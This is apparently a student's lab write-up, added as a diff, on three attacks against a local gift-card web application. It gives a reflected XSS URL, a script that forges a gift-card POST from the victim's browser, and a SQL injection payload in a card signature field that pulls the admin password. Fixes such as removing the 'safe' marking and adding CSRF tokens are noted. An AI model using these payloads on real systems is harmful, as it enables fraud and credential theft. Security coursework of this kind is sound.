@@ -1,0 +1,42 @@
+ 
+
+Attack 1
+
+http://127.0.0.1:8000/gift.html?director=%3Cscript%3Ealert(%22intruder%22)%3C/script%3E=
+that attack s scros site scripting if you modified the users URL to have director point to http://127.0.0.1:8000/gift.html?director=%3Cscript%3Ealert(%22intruder%22)%3C/script%3E=
+the result is the image above.
+solution is to remove the safe tag found Endorsed by {{director}}!</p> . the reasoning is that with the safe tag the attacker can turn off auto escape as an execution of payload is successful. 
+
+
+
+Attack 2:
+For this attack, we make a user send a POST request that gifts a card to our account without their knowledge by taking advantage
+of XSS. We again inject a script into the HTML that has been marked as safe. The script that gets executed is the following:
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "/gift/0", true);
+    var formData = new FormData();
+    formData.append("username", "bob");
+    formData.append("amount", "2000");
+    xhr.send(formData);
+
+This creates a POST request from the victim user's browser, and gifts the attacker's account the amount indicated. This script is embedded
+in a URL supplied to the victim, for example:
+
+http://127.0.0.1:8000/gift.html?director=%3Cscript%20id=%22maliciousScript%22%3E%20let%20xhr%20=%20new%20XMLHttpRequest();%20xhr.open(%22POST%22,%20%27/gift/0%27,%20true);%20var%20formData%20=%20new%20FormData();%20formData.append(%22username%22,%20%22Chris%22);%20formData.append(%22amount%22,%20%221000%22);%20xhr.send(formData);%20%3C/script%3E
+
+To solve this, we again need to remove the `safe` marking for the HTML, so that the supplied script is escaped and not executed by the victim's browser.
+While we achieved this attack using XSS, similar attacks may be possible to accomplish by CSRF. In order to protect against this, we will want to include CSRF token
+in our request.
+
+
+Attack 3:
+ 
+
+"merchant_id": "NYU Apparel Card", "customer_id": "takemymoney", "total_value": "80", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "[ insert crypto signature here ]' UNION Select password from LegacySite_user where LegacySite_user.username='admin';--"}]}
+
+
+
+
+
+
